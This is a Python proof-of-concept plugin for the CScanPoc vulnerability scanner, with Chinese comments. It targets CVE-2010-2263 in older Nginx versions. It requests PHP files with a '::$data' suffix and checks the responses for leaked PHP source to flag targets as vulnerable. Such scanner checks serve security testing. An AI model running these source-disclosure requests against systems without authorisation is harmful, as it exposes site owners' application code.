# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Nginx_0000'  # 平台漏洞编号，留空
    name = 'Nginx HTTP请求源码泄露和拒绝服务'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2010-06-11'  # 漏洞公布时间
    desc = '''
        Nginx是多平台的HTTP服务器和邮件代理服务器。 
        Nginx服务器无法处理交换数据流(ADS)，将其处理为普通文件的数据量。攻击者可以使用filename::$data的形式读取并下载Web应用文件的源码；
        此外如果在HTTP请求中添加了目录遍历序列的话，就可以覆盖内存寄存器，导致拒绝服务。
    '''  # 漏洞描述
    ref = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2263'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2010-2263'  # cve编号
    product = 'Nginx'  # 漏洞应用名称
    product_version = '0.8 before 0.8.40 and 0.7 before 0.7.66'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c66042b7-5690-41f9-b105-abd245b28802'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            url = self.target
            payloads = ['/index.php', '/default.php']
            code, head, noexistbody, error, _ = hh.http(
                url + '/noexistpagenoexistpage.php::$data')
            for payload in payloads:
                payload += '::$data'
                addr = url + payload
                code, head, body, error, _ = hh.http(addr)
                if code == 200:
                    m = re.findall(r'<\?(php|)(.*?)\?>', body)
                    for x in m:
                        if x[1] in noexistbody:
                            continue
                        if x[0] == 'php':
                            # security_hole(addr)
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))
                            break
                        if '$' in x[1] or 'include' in x[1]:
                            # security_hole(addr)
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))
                            break

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
